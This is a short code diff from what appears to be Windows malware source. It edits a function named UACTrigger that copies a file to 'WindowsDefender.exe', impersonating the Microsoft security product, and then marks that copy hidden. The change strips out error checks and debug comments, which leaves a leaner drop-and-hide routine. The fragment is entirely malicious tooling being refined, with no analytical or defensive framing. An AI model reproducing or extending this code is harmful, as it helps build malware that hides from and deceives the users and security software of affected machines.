@@ -14,18 +14,10 @@ void UACTrigger() {
     SHELLEXECUTEINFO sei = {sizeof(sei)};
 
     // WriteOutput("Copying to WindowsDefender.exe\n");
-    if(!CopyFile( DIR , "WindowsDefender.exe", FALSE ))
-    {
-        // memset(err, 0, 200);
-        // snprintf(err, 200,"\nError : %i\n", GetLastError());
-        // WriteOutput("Error Copying file!");
-        // WriteOutput(err);
-    }
-
+    CopyFile( DIR , "WindowsDefender.exe", FALSE );
     DWORD attributes = GetFileAttributes("WindowsDefender.exe");
     if (attributes != FILE_ATTRIBUTE_HIDDEN)
     {
-        // WriteOutput("Hiding WindowsDefender.exe");
         SetFileAttributes("WindowsDefender.exe", attributes + FILE_ATTRIBUTE_HIDDEN);
     }
 
